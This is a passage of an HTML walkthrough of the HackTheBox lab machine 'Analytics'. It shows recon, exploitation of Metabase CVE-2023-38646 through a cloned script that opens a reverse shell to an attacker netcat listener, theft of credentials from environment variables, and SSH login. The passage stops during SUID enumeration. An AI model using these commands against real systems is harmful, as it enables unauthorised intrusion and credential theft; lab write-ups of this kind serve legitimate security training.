@@ -1,0 +1,322 @@
+
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Analytics - HTB</title>
+    <link rel="stylesheet" href="/styles.css">
+    <link rel="stylesheet" href="/writeups.css">
+    <link rel="stylesheet" href="/monokai.css">
+</head>
+<body>
+    <header>
+        <nav>
+            <ul>
+                <li><a href="/index.html">Home</a></li>
+				<li><a href="/articles.html">Articles</a></li>
+                <li><a href="/writeups.html">Writeups</a></li>
+                <li><a href="https://github.com/elswix/KL-Sunset" target="_blank">KL-Sunset</a></li>
+                <li><a href="/about.html">About me</a></li>
+            </ul>
+        </nav>
+    </header>
+    <section class="writeup-content">
+        <div class="container">
+            <div class="writeup-panel">
+                <img src="/writeups/htb/easy/analytics/img/analytics.png" alt="Machine Icon" class="machine-icon-circle">
+                <h2>Analytics - HTB</h2>
+                <p>walkthrough by elswix<p>
+                <ul class="machine-links">
+                    <li><a href="https://app.hackthebox.com/machines/Analytics">HackTheBox</a></li>
+                </ul>
+            </div>
+            <div class="writeup-content-main">
+                <div class="highlight"><pre><span></span><span class="k">Machine</span><span class="p">:</span> <span class="n">Analytics</span>
+<span class="k">Difficulty</span><span class="p">:</span> <span class="n">Easy</span>
+<span class="k">Platform</span><span class="p">:</span> <span class="n">HackTheBox</span>
+<span class="k">Release</span><span class="p">:</span> <span class="n">Released</span> <span class="n">on</span> <span class="mi">10</span><span class="o">/</span><span class="mi">07</span><span class="o">/</span><span class="mi">2023</span>
+</pre></div>
+<h3>About Analytics</h3><br/>
+<p>Analytics is an easy machine on HackTheBox. Firstly, we'll exploit a vulnerable version of Metabase to achieve command execution on the victim machine, thereby allowing us to gain access to a container.</p><br/>
+<h3>Shell as metalytics</h3><br/>
+<p>Enumerating the environment variables on the container, we obtain valid credentials for <code>metalytics</code>. We use these credentials to gain access to the actual system via SSH.</p><br/>
+<h3>Shell as root</h3><br/>
+<p>Taking a look at the mounts, we notice that Docker is using OverlayFS. Since the kernel is vulnerable, we exploit OverlayFS to achieve code execution as root.</p><br/>
+<h3>Notice:</h3><br/>
+<p>You may encounter some issues when running the port scan, as it probably won't report port 22 as open when the machine starts (at least in my experience). I had to wait a few minutes until the port was opened. However, this port is not necessary for the initial foothold, but we'll use it at some point during the machine's exploitation.</p><br/>
+<h3>Recon</h3><br/>
+<p>Initially, we'll conduct a port scan to discover open ports on the victim machine:</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">nmap</span> <span class="o">--</span><span class="nb">open</span> <span class="mf">10.10.11.233</span> <span class="o">--</span><span class="nb">min</span><span class="o">-</span><span class="n">rate</span> <span class="mi">1000</span>
+
+<span class="n">Nmap</span> <span class="n">scan</span> <span class="n">report</span> <span class="k">for</span> <span class="n">analytical</span><span class="o">.</span><span class="n">htb</span> <span class="p">(</span><span class="mf">10.10.11.233</span><span class="p">)</span>
+<span class="n">Host</span> <span class="ow">is</span> <span class="n">up</span> <span class="p">(</span><span class="mf">0.16</span><span class="n">s</span> <span class="n">latency</span><span class="p">)</span><span class="o">.</span>
+<span class="n">Not</span> <span class="n">shown</span><span class="p">:</span> <span class="mi">985</span> <span class="n">closed</span> <span class="n">tcp</span> <span class="n">ports</span> <span class="p">(</span><span class="n">conn</span><span class="o">-</span><span class="n">refused</span><span class="p">),</span> <span class="mi">13</span> <span class="n">filtered</span> <span class="n">tcp</span> <span class="n">ports</span> <span class="p">(</span><span class="n">no</span><span class="o">-</span><span class="n">response</span><span class="p">)</span>
+<span class="n">Some</span> <span class="n">closed</span> <span class="n">ports</span> <span class="n">may</span> <span class="n">be</span> <span class="n">reported</span> <span class="k">as</span> <span class="n">filtered</span> <span class="n">due</span> <span class="n">to</span> <span class="o">--</span><span class="n">defeat</span><span class="o">-</span><span class="n">rst</span><span class="o">-</span><span class="n">ratelimit</span>
+<span class="n">PORT</span>   <span class="n">STATE</span> <span class="n">SERVICE</span>
+<span class="mi">22</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">ssh</span>
+<span class="mi">80</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">http</span>
+</pre></div>
+<h3>HTTP Service - Port 80</h3><br/>
+<p>As we lack valid credentials, we're unable to connect to the SSH Service. Therefore, we'll begin enumerating the HTTP Service hosted on port 80.</p><br/>
+<p>Upon sending a GET request to the victim's IP address, I observed that there is a redirect:</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">curl</span> <span class="o">-</span><span class="n">s</span> <span class="mf">10.10.11.233</span>
+<span class="o">&lt;</span><span class="n">html</span><span class="o">&gt;</span>
+<span class="o">&lt;</span><span class="n">head</span><span class="o">&gt;&lt;</span><span class="n">title</span><span class="o">&gt;</span><span class="mi">302</span> <span class="n">Found</span><span class="o">&lt;/</span><span class="n">title</span><span class="o">&gt;&lt;/</span><span class="n">head</span><span class="o">&gt;</span>
+<span class="o">&lt;</span><span class="n">body</span><span class="o">&gt;</span>
+<span class="o">&lt;</span><span class="n">center</span><span class="o">&gt;&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="mi">302</span> <span class="n">Found</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;&lt;/</span><span class="n">center</span><span class="o">&gt;</span>
+<span class="o">&lt;</span><span class="n">hr</span><span class="o">&gt;&lt;</span><span class="n">center</span><span class="o">&gt;</span><span class="n">nginx</span><span class="o">/</span><span class="mf">1.18.0</span> <span class="p">(</span><span class="n">Ubuntu</span><span class="p">)</span><span class="o">&lt;/</span><span class="n">center</span><span class="o">&gt;</span>
+<span class="o">&lt;/</span><span class="n">body</span><span class="o">&gt;</span>
+<span class="o">&lt;/</span><span class="n">html</span><span class="o">&gt;</span>
+</pre></div>
+<p>Taking a look at the response headers, I noticed that we're being redirected to a new domain:</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">curl</span> <span class="o">-</span><span class="n">s</span> <span class="mf">10.10.11.233</span> <span class="o">-</span><span class="n">I</span>
+<span class="n">HTTP</span><span class="o">/</span><span class="mf">1.1</span> <span class="mi">302</span> <span class="n">Moved</span> <span class="n">Temporarily</span>
+<span class="n">Server</span><span class="p">:</span> <span class="n">nginx</span><span class="o">/</span><span class="mf">1.18.0</span> <span class="p">(</span><span class="n">Ubuntu</span><span class="p">)</span>
+<span class="n">Date</span><span class="p">:</span> <span class="n">Tue</span><span class="p">,</span> <span class="mi">19</span> <span class="n">Mar</span> <span class="mi">2024</span> <span class="mi">13</span><span class="p">:</span><span class="mi">58</span><span class="p">:</span><span class="mi">35</span> <span class="n">GMT</span>
+<span class="n">Content</span><span class="o">-</span><span class="n">Type</span><span class="p">:</span> <span class="n">text</span><span class="o">/</span><span class="n">html</span>
+<span class="n">Content</span><span class="o">-</span><span class="n">Length</span><span class="p">:</span> <span class="mi">154</span>
+<span class="n">Connection</span><span class="p">:</span> <span class="n">keep</span><span class="o">-</span><span class="n">alive</span>
+<span class="n">Location</span><span class="p">:</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">analytical</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span>
+<span class="nd">elswix@ubuntu$</span>
+</pre></div>
+<p>To enable domain resolution, I'll add it to my <code>hosts</code> file and point it to the victim's IP address.</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">cat</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">hosts</span>
+<span class="mf">127.0.0.1</span>   <span class="n">localhost</span>
+<span class="mf">127.0.1.1</span>   <span class="n">Hackency</span>
+
+<span class="c1"># The following lines are desirable for IPv6 capable hosts</span>
+<span class="p">::</span><span class="mi">1</span>     <span class="n">ip6</span><span class="o">-</span><span class="n">localhost</span> <span class="n">ip6</span><span class="o">-</span><span class="n">loopback</span>
+<span class="n">fe00</span><span class="p">::</span><span class="mi">0</span> <span class="n">ip6</span><span class="o">-</span><span class="n">localnet</span>
+<span class="n">ff00</span><span class="p">::</span><span class="mi">0</span> <span class="n">ip6</span><span class="o">-</span><span class="n">mcastprefix</span>
+<span class="n">ff02</span><span class="p">::</span><span class="mi">1</span> <span class="n">ip6</span><span class="o">-</span><span class="n">allnodes</span>
+<span class="n">ff02</span><span class="p">::</span><span class="mi">2</span> <span class="n">ip6</span><span class="o">-</span><span class="n">allrouters</span>
+
+<span class="mf">10.10.11.233</span> <span class="n">analytical</span><span class="o">.</span><span class="n">htb</span>
+</pre></div>
+<p>Now, the domain is resolving correctly:</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">curl</span> <span class="o">-</span><span class="n">s</span> <span class="mf">10.10.11.233</span> <span class="o">-</span><span class="n">I</span> <span class="o">-</span><span class="n">L</span>
+<span class="n">HTTP</span><span class="o">/</span><span class="mf">1.1</span> <span class="mi">302</span> <span class="n">Moved</span> <span class="n">Temporarily</span>
+<span class="n">Server</span><span class="p">:</span> <span class="n">nginx</span><span class="o">/</span><span class="mf">1.18.0</span> <span class="p">(</span><span class="n">Ubuntu</span><span class="p">)</span>
+<span class="n">Date</span><span class="p">:</span> <span class="n">Tue</span><span class="p">,</span> <span class="mi">19</span> <span class="n">Mar</span> <span class="mi">2024</span> <span class="mi">14</span><span class="p">:</span><span class="mi">03</span><span class="p">:</span><span class="mi">27</span> <span class="n">GMT</span>
+<span class="n">Content</span><span class="o">-</span><span class="n">Type</span><span class="p">:</span> <span class="n">text</span><span class="o">/</span><span class="n">html</span>
+<span class="n">Content</span><span class="o">-</span><span class="n">Length</span><span class="p">:</span> <span class="mi">154</span>
+<span class="n">Connection</span><span class="p">:</span> <span class="n">keep</span><span class="o">-</span><span class="n">alive</span>
+<span class="n">Location</span><span class="p">:</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">analytical</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span>
+
+<span class="n">HTTP</span><span class="o">/</span><span class="mf">1.1</span> <span class="mi">200</span> <span class="n">OK</span>
+<span class="n">Server</span><span class="p">:</span> <span class="n">nginx</span><span class="o">/</span><span class="mf">1.18.0</span> <span class="p">(</span><span class="n">Ubuntu</span><span class="p">)</span>
+<span class="n">Date</span><span class="p">:</span> <span class="n">Tue</span><span class="p">,</span> <span class="mi">19</span> <span class="n">Mar</span> <span class="mi">2024</span> <span class="mi">14</span><span class="p">:</span><span class="mi">03</span><span class="p">:</span><span class="mi">28</span> <span class="n">GMT</span>
+<span class="n">Content</span><span class="o">-</span><span class="n">Type</span><span class="p">:</span> <span class="n">text</span><span class="o">/</span><span class="n">html</span>
+<span class="n">Content</span><span class="o">-</span><span class="n">Length</span><span class="p">:</span> <span class="mi">17169</span>
+<span class="n">Last</span><span class="o">-</span><span class="n">Modified</span><span class="p">:</span> <span class="n">Fri</span><span class="p">,</span> <span class="mi">25</span> <span class="n">Aug</span> <span class="mi">2023</span> <span class="mi">15</span><span class="p">:</span><span class="mi">24</span><span class="p">:</span><span class="mi">42</span> <span class="n">GMT</span>
+<span class="n">Connection</span><span class="p">:</span> <span class="n">keep</span><span class="o">-</span><span class="n">alive</span>
+<span class="n">ETag</span><span class="p">:</span> <span class="s2">"64e8c7ba-4311"</span>
+<span class="n">Accept</span><span class="o">-</span><span class="n">Ranges</span><span class="p">:</span> <span class="nb">bytes</span>
+<span class="nd">elswix@ubuntu$</span>
+</pre></div>
+<p>When accessing the website through our browser, we'll encounter the following:</p><br/>
+<p><img alt="" src="https://elswix.github.io/writeups/htb/easy/analytics/img/1.png"/></p><br/>
+<p>It's a static page with nothing relevant at the moment. However, when hovering over the <code>Login</code> hyperlink, you can observe that it redirects to a new subdomain:</p><br/>
+<p><img alt="" src="https://elswix.github.io/writeups/htb/easy/analytics/img/2.png"/></p><br/>
+<p>I'll add it to my <code>hosts</code> file:</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">cat</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">hosts</span>
+<span class="mf">127.0.0.1</span>   <span class="n">localhost</span>
+<span class="mf">127.0.1.1</span>   <span class="n">Hackency</span>
+
+<span class="c1"># The following lines are desirable for IPv6 capable hosts</span>
+<span class="p">::</span><span class="mi">1</span>     <span class="n">ip6</span><span class="o">-</span><span class="n">localhost</span> <span class="n">ip6</span><span class="o">-</span><span class="n">loopback</span>
+<span class="n">fe00</span><span class="p">::</span><span class="mi">0</span> <span class="n">ip6</span><span class="o">-</span><span class="n">localnet</span>
+<span class="n">ff00</span><span class="p">::</span><span class="mi">0</span> <span class="n">ip6</span><span class="o">-</span><span class="n">mcastprefix</span>
+<span class="n">ff02</span><span class="p">::</span><span class="mi">1</span> <span class="n">ip6</span><span class="o">-</span><span class="n">allnodes</span>
+<span class="n">ff02</span><span class="p">::</span><span class="mi">2</span> <span class="n">ip6</span><span class="o">-</span><span class="n">allrouters</span>
+
+<span class="mf">10.10.11.233</span> <span class="n">analytical</span><span class="o">.</span><span class="n">htb</span> <span class="n">data</span><span class="o">.</span><span class="n">analytical</span><span class="o">.</span><span class="n">htb</span>
+<span class="nd">elswix@ubuntu$</span>
+</pre></div>
+<p>When accessing <code>data.analytical.htb</code>, we encounter the following content:</p><br/>
+<p><img alt="" src="https://elswix.github.io/writeups/htb/easy/analytics/img/4.png"/></p><br/>
+<p>This is the Metabase authentication panel. Metabase is an open-source data analytics platform.</p><br/>
+<p>Upon searching for Metabase-related vulnerabilities, I came across the <a href="https://nvd.nist.gov/vuln/detail/CVE-2023-38646">CVE-2023-38646</a> vulnerability. <a href="https://nvd.nist.gov/vuln/detail/CVE-2023-38646">NVD</a> describes this vulnerability as an unauthenticated remote code execution (RCE) vulnerability. As you can imagine, vulnerabilities of this type are categorized as Critical.</p><br/>
+<p>If the running version is vulnerable, we could potentially achieve arbitrary code execution, allowing us to gain access to the system.</p><br/>
+<p>This <a href="https://pentest-tools.com/vulnerabilities-exploits/metabase-remote-code-execution_22">article</a> states: <em>"The root cause of this vulnerability is that the setup token is not cleared after the setup is completed. This allows an unauthenticated attacker to obtain the setup token and utilize it to execute commands on the target remotely."</em></p><br/>
+<p>After looking for exploits I found <a href="https://github.com/securezeron/CVE-2023-38646">this one</a> by securezeron. I'll clone the github repo:</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">git</span> <span class="n">clone</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">github</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">securezeron</span><span class="o">/</span><span class="n">CVE</span><span class="o">-</span><span class="mi">2023</span><span class="o">-</span><span class="mi">38646</span>
+<span class="n">Cloning</span> <span class="n">into</span> <span class="s1">'CVE-2023-38646'</span><span class="o">...</span>
+<span class="n">remote</span><span class="p">:</span> <span class="n">Enumerating</span> <span class="n">objects</span><span class="p">:</span> <span class="mi">15</span><span class="p">,</span> <span class="n">done</span><span class="o">.</span>
+<span class="n">remote</span><span class="p">:</span> <span class="n">Counting</span> <span class="n">objects</span><span class="p">:</span> <span class="mi">100</span><span class="o">%</span> <span class="p">(</span><span class="mi">15</span><span class="o">/</span><span class="mi">15</span><span class="p">),</span> <span class="n">done</span><span class="o">.</span>
+<span class="n">remote</span><span class="p">:</span> <span class="n">Compressing</span> <span class="n">objects</span><span class="p">:</span> <span class="mi">100</span><span class="o">%</span> <span class="p">(</span><span class="mi">10</span><span class="o">/</span><span class="mi">10</span><span class="p">),</span> <span class="n">done</span><span class="o">.</span>
+<span class="n">remote</span><span class="p">:</span> <span class="n">Total</span> <span class="mi">15</span> <span class="p">(</span><span class="n">delta</span> <span class="mi">1</span><span class="p">),</span> <span class="n">reused</span> <span class="mi">5</span> <span class="p">(</span><span class="n">delta</span> <span class="mi">0</span><span class="p">),</span> <span class="n">pack</span><span class="o">-</span><span class="n">reused</span> <span class="mi">0</span>
+<span class="n">Receiving</span> <span class="n">objects</span><span class="p">:</span> <span class="mi">100</span><span class="o">%</span> <span class="p">(</span><span class="mi">15</span><span class="o">/</span><span class="mi">15</span><span class="p">),</span> <span class="mf">5.70</span> <span class="n">KiB</span> <span class="o">|</span> <span class="mf">5.70</span> <span class="n">MiB</span><span class="o">/</span><span class="n">s</span><span class="p">,</span> <span class="n">done</span><span class="o">.</span>
+<span class="n">Resolving</span> <span class="n">deltas</span><span class="p">:</span> <span class="mi">100</span><span class="o">%</span> <span class="p">(</span><span class="mi">1</span><span class="o">/</span><span class="mi">1</span><span class="p">),</span> <span class="n">done</span><span class="o">.</span>
+<span class="nd">elswix@ubuntu$</span> <span class="n">cd</span> <span class="n">CVE</span><span class="o">-</span><span class="mi">2023</span><span class="o">-</span><span class="mi">38646</span>
+</pre></div>
+<p>After examining the source code, we notice that it will send us a reverse shell.</p><br/>
+<p><img alt="" src="https://elswix.github.io/writeups/htb/easy/analytics/img/6.png"/></p><br/>
+<p>Using this exploit is very straightforward:</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">python3</span> <span class="n">CVE</span><span class="o">-</span><span class="mi">2023</span><span class="o">-</span><span class="mi">38646</span><span class="o">-</span><span class="n">Reverse</span><span class="o">-</span><span class="n">Shell</span><span class="o">.</span><span class="n">py</span> <span class="o">-</span><span class="n">h</span>
+<span class="n">usage</span><span class="p">:</span> <span class="n">CVE</span><span class="o">-</span><span class="mi">2023</span><span class="o">-</span><span class="mi">38646</span><span class="o">-</span><span class="n">Reverse</span><span class="o">-</span><span class="n">Shell</span><span class="o">.</span><span class="n">py</span> <span class="p">[</span><span class="o">-</span><span class="n">h</span><span class="p">]</span> <span class="p">[</span><span class="o">--</span><span class="n">rhost</span> <span class="n">RHOST</span><span class="p">]</span> <span class="p">[</span><span class="o">--</span><span class="n">lhost</span> <span class="n">LHOST</span><span class="p">]</span> <span class="p">[</span><span class="o">--</span><span class="n">lport</span> <span class="n">LPORT</span><span class="p">]</span>
+
+<span class="n">Check</span> <span class="n">setup</span> <span class="n">token</span>
+
+<span class="n">options</span><span class="p">:</span>
+  <span class="o">-</span><span class="n">h</span><span class="p">,</span> <span class="o">--</span><span class="n">help</span>     <span class="n">show</span> <span class="n">this</span> <span class="n">help</span> <span class="n">message</span> <span class="ow">and</span> <span class="n">exit</span>
+  <span class="o">--</span><span class="n">rhost</span> <span class="n">RHOST</span>  <span class="n">Metabase</span> <span class="n">server</span> <span class="n">IP</span> <span class="n">address</span> <span class="p">(</span><span class="n">including</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span> <span class="ow">or</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span> <span class="ow">and</span> <span class="n">port</span> <span class="n">number</span> <span class="k">if</span> <span class="n">needed</span><span class="p">)</span>
+  <span class="o">--</span><span class="n">lhost</span> <span class="n">LHOST</span>  <span class="n">Listener</span> <span class="n">IP</span> <span class="n">address</span>
+  <span class="o">--</span><span class="n">lport</span> <span class="n">LPORT</span>  <span class="n">Listener</span> <span class="n">port</span> <span class="p">(</span><span class="n">default</span> <span class="ow">is</span> <span class="mi">4444</span><span class="p">)</span>
+<span class="nd">elswix@ubuntu$</span>
+</pre></div>
+<p>We need to specify the remote host, i.e., <code>data.analytical.htb</code>, the local host, and the local port, essentially our attacker's IP address and the port we'll be listening on with netcat.</p><br/>
+<p>Before running this exploit, I'll set up my netcat listener on port 3001:</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">nc</span> <span class="o">-</span><span class="n">lvnp</span> <span class="mi">3001</span>
+<span class="n">Listening</span> <span class="n">on</span> <span class="mf">0.0.0.0</span> <span class="mi">3001</span>
+</pre></div>
+<p>Finally, let's run the exploit:</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">python3</span> <span class="n">CVE</span><span class="o">-</span><span class="mi">2023</span><span class="o">-</span><span class="mi">38646</span><span class="o">-</span><span class="n">Reverse</span><span class="o">-</span><span class="n">Shell</span><span class="o">.</span><span class="n">py</span> <span class="o">--</span><span class="n">rhost</span> <span class="s1">'http://data.analytical.htb'</span> <span class="o">--</span><span class="n">lhost</span> <span class="mf">10.10.16.5</span> <span class="o">--</span><span class="n">lport</span> <span class="mi">3001</span>
+<span class="p">[</span><span class="n">DEBUG</span><span class="p">]</span> <span class="n">Original</span> <span class="n">rhost</span><span class="p">:</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">data</span><span class="o">.</span><span class="n">analytical</span><span class="o">.</span><span class="n">htb</span>
+<span class="p">[</span><span class="n">DEBUG</span><span class="p">]</span> <span class="n">Preprocessed</span> <span class="n">rhost</span><span class="p">:</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">data</span><span class="o">.</span><span class="n">analytical</span><span class="o">.</span><span class="n">htb</span>
+<span class="o">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="o">...</span>
+        <span class="p">},</span>
+        <span class="s2">"name"</span><span class="p">:</span> <span class="s2">"test"</span><span class="p">,</span>
+        <span class="s2">"engine"</span><span class="p">:</span> <span class="s2">"h2"</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+<span class="o">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="o">...</span>
+<span class="p">[</span><span class="n">DEBUG</span><span class="p">]</span> <span class="n">POST</span> <span class="n">to</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">data</span><span class="o">.</span><span class="n">analytical</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span><span class="n">api</span><span class="o">/</span><span class="n">setup</span><span class="o">/</span><span class="n">validate</span> <span class="n">failed</span> <span class="k">with</span> <span class="n">status</span> <span class="n">code</span><span class="p">:</span> <span class="mi">400</span>
+<span class="nd">elswix@ubuntu$</span>
+</pre></div>
+<p>And on netcat, we successfully received the reverse shell:</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">nc</span> <span class="o">-</span><span class="n">lvnp</span> <span class="mi">3001</span>
+<span class="n">Listening</span> <span class="n">on</span> <span class="mf">0.0.0.0</span> <span class="mi">3001</span>
+<span class="n">Connection</span> <span class="n">received</span> <span class="n">on</span> <span class="mf">10.10.11.233</span> <span class="mi">35038</span>
+<span class="n">bash</span><span class="p">:</span> <span class="n">cannot</span> <span class="nb">set</span> <span class="n">terminal</span> <span class="n">process</span> <span class="n">group</span> <span class="p">(</span><span class="mi">1</span><span class="p">):</span> <span class="n">Not</span> <span class="n">a</span> <span class="n">tty</span>
+<span class="n">bash</span><span class="p">:</span> <span class="n">no</span> <span class="n">job</span> <span class="n">control</span> <span class="ow">in</span> <span class="n">this</span> <span class="n">shell</span>
+<span class="nd">701b9ace9dee</span><span class="p">:</span><span class="o">/</span><span class="err">$</span> <span class="n">whoami</span>
+<span class="n">whoami</span>
+<span class="n">metabase</span>
+<span class="nd">701b9ace9dee</span><span class="p">:</span><span class="o">/</span><span class="err">$</span>
+</pre></div>
+<p>It seems that we gained access to a container:</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">701b9ace9dee</span><span class="p">:</span><span class="o">/</span><span class="err">$</span> <span class="n">hostname</span>
+<span class="n">hostname</span>
+<span class="n">701b9ace9dee</span>
+<span class="nd">701b9ace9dee</span><span class="p">:</span><span class="o">/</span><span class="err">$</span>
+</pre></div>
+<h3>Shell as metalytics</h3><br/>
+<p>When examining the environment variables using <code>env</code>, we notice something quite interesting:</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">701b9ace9dee</span><span class="p">:</span><span class="o">/</span><span class="err">$</span> <span class="n">env</span>
+<span class="n">env</span>
+<span class="n">SHELL</span><span class="o">=/</span><span class="nb">bin</span><span class="o">/</span><span class="n">sh</span>
+<span class="n">MB_DB_PASS</span><span class="o">=</span>
+<span class="n">HOSTNAME</span><span class="o">=</span><span class="mi">9</span><span class="n">af62382354a</span>
+<span class="o">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="o">...</span>
+<span class="n">HOME</span><span class="o">=/</span><span class="n">home</span><span class="o">/</span><span class="n">metabase</span>
+<span class="n">LANG</span><span class="o">=</span><span class="n">en_US</span><span class="o">.</span><span class="n">UTF</span><span class="o">-</span><span class="mi">8</span>
+<span class="n">META_USER</span><span class="o">=</span><span class="n">metalytics</span>
+<span class="n">META_PASS</span><span class="o">=</span><span class="n">An4lytics_ds20223</span><span class="c1">#</span>
+<span class="n">MB_EMAIL_SMTP_PASSWORD</span><span class="o">=</span>
+<span class="n">USER</span><span class="o">=</span><span class="n">metabase</span>
+<span class="n">SHLVL</span><span class="o">=</span><span class="mi">4</span>
+<span class="o">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="o">...</span>
+<span class="n">MB_DB_CONNECTION_URI</span><span class="o">=</span>
+<span class="n">JAVA_VERSION</span><span class="o">=</span><span class="n">jdk</span><span class="o">-</span><span class="mf">11.0.19</span><span class="o">+</span><span class="mi">7</span>
+<span class="n">_</span><span class="o">=/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">env</span>
+<span class="nd">701b9ace9dee</span><span class="p">:</span><span class="o">/</span><span class="err">$</span>
+</pre></div>
+<p>As you can see, there are credentials stored in the environment variables. Since port 22 is open on the victim machine, I'll attempt to connect to the SSH service using these credentials.</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">sshpass</span> <span class="o">-</span><span class="n">p</span> <span class="s1">'An4lytics_ds20223#'</span> <span class="n">ssh</span> <span class="n">metalytics</span><span class="o">@</span><span class="mf">10.10.11.233</span>
+<span class="o">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="o">...</span>
+<span class="nd">metalytics@analytics</span><span class="p">:</span><span class="o">~$</span>
+</pre></div>
+<p>Great! Those credentials are valid for SSH, so we've gained access to the system as <code>metalytics</code>. Furthermore, we're on the actual machine, not inside a container.</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">metalytics@analytics</span><span class="p">:</span><span class="o">~$</span> <span class="n">export</span> <span class="n">TERM</span><span class="o">=</span><span class="n">xterm</span><span class="o">-</span><span class="mi">256</span><span class="n">color</span>
+<span class="nd">metalytics@analytics</span><span class="p">:</span><span class="o">~$</span> <span class="o">.</span> <span class="o">~/.</span><span class="n">bashrc</span>
+<span class="nd">metalytics@analytics</span><span class="p">:</span><span class="o">~$</span> <span class="n">hostname</span>
+<span class="n">analytics</span>
+<span class="nd">metalytics@analytics</span><span class="p">:</span><span class="o">~$</span>
+</pre></div>
+<p>We can read <code>user.txt</code>:</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">metalytics@analytics</span><span class="p">:</span><span class="o">~$</span> <span class="n">cat</span> <span class="n">user</span><span class="o">.</span><span class="n">txt</span>
+<span class="n">de89c</span><span class="o">******************</span><span class="mi">37449</span><span class="n">b8d5</span>
+<span class="nd">metalytics@analytics</span><span class="p">:</span><span class="o">~$</span>
+</pre></div>
+<p>As <code>metalytics</code>, we don't have sudo privileges:</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">metalytics@analytics</span><span class="p">:</span><span class="o">~$</span> <span class="n">sudo</span> <span class="o">-</span><span class="n">l</span>
+<span class="p">[</span><span class="n">sudo</span><span class="p">]</span> <span class="n">password</span> <span class="k">for</span> <span class="n">metalytics</span><span class="p">:</span> 
+<span class="n">Sorry</span><span class="p">,</span> <span class="n">user</span> <span class="n">metalytics</span> <span class="n">may</span> <span class="ow">not</span> <span class="n">run</span> <span class="n">sudo</span> <span class="n">on</span> <span class="n">localhost</span><span class="o">.</span>
+<span class="nd">metalytics@analytics</span><span class="p">:</span><span class="o">~$</span>
+</pre></div>
+<p><code>Metalytics</code> does not belong to any special group.</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">metalytics@analytics</span><span class="p">:</span><span class="o">~$</span> <span class="nb">id</span>
+<span class="n">uid</span><span class="o">=</span><span class="mi">1000</span><span class="p">(</span><span class="n">metalytics</span><span class="p">)</span> <span class="n">gid</span><span class="o">=</span><span class="mi">1000</span><span class="p">(</span><span class="n">metalytics</span><span class="p">)</span> <span class="n">groups</span><span class="o">=</span><span class="mi">1000</span><span class="p">(</span><span class="n">metalytics</span><span class="p">)</span>
+<span class="nd">metalytics@analytics</span><span class="p">:</span><span class="o">~$</span>
+</pre></div>
+<p>There are no intriguing <code>Set-UID</code> files:</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">metalytics@analytics</span><span class="p">:</span><span class="o">~$</span> <span class="n">find</span> <span class="o">/</span> <span class="o">-</span><span class="n">perm</span> <span class="o">-</span><span class="mi">4000</span> <span class="mi">2</span><span class="o">&gt;/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span>
+<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">newgrp</span>
+<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">gpasswd</span>
+<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">su</span>
+<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">umount</span>
+<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">chsh</span>
+<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">fusermount3</span>
+<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">sudo</span>
